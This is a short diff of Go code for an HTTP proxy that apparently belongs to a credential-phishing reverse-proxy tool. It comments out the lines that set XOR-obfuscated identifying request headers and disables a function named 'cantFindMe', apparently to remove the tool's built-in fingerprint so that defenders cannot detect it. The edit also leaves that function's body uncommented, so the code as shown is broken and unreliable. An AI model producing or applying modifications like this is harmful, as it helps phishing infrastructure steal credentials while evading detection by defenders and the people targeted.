@@ -404,7 +404,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				req.Header.Set(string(hg), egg2)
+				//req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains
 				if pl != nil {
@@ -563,7 +563,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				for n, b := range e {
 					e[n] = b ^ 0x88
 				}
-				req.Header.Set(string(e), e_host)
+				//req.Header.Set(string(e), e_host)
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 					s, ok := p.sessions[ps.SessionId]
@@ -1453,7 +1453,7 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
 	return sid, ok
 }
 
-func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
+//func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
 	var b []byte = []byte("\x1dh\x003,)\",+=")
 	for n, c := range b {
 		b[n] = c ^ 0x45
